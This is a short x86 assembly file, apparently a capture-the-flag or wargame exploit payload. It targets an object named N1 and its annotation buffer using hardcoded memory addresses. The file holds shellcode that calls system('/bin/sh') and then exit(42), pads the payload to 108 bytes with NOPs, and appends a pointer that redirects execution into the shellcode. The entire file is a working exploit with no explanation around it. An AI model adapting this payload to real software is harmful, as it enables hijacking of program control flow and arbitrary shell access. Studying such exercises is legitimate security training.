        .intel_syntax noprefix

        .set N1,          0x0804a008
        .set binsh,       0xb7ea7c58
        .set libc_system, 0xb7d86060
        .set libc_exit,   0xb7d79be0

        .section .rodata

payload_start:
        // &N1->annotation[4]
        .int N1 + 8

        // system("/bin/sh")
        mov dword ptr [esp], binsh
        mov eax, libc_system
        call eax

        // exit(42)
        xor eax, eax
        mov al, 42
        mov [esp], eax
        mov eax, libc_exit
        call eax

shellcode_end:
        .rept 108 - (shellcode_end - payload_start)
        nop
        .endr

        // &N1->annotation[0]
        .int N1 + 4
